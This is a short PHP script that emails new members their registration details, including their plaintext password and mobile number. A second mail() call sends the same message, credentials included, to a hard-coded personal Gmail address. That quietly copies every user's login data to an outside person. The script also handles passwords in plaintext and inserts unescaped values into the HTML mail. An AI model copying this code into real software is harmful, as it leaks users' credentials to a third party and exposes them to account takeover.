 <?php

 
 $subject = "Your registration on ".$domainName;
 
 
 $message = "Hi ".$name.'<br>';

 $message .= 'Thanks for registration on  '.$domainName.'<br>';
 $message .= 'Please find your login details as below :<br/>';
 $message .= 'Member ID :'.$memberID.'<br/>';
 $message .= 'User Name :'.$email.'<br/>';
 $message .= 'Password :'.$pass.'<br/>';
 $message .= 'Mobile Number: :'.$mobile.'<br/>';
 $message .= 'Registration Date: :'.$join_date.'<br/><br/>';

 $message .= 'Thanks<br/>';
 $message .= 'Dhanyog Team<br/><br>';
 $message .= 'website:'.$domain.'<br/>';

 
 
 $to_email = $email;
 $from_email="admin@getdailyincome.in";

 
 $headers = "MIME-Version: 1.0" . "\r\n";
 $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 $headers .= 'From: '.$from_email;
 mail($to_email,$subject,$message,$headers);
 mail("pcsaini@gmail.com",$subject,$message,$headers);

//smtp auth(missing)
 ?>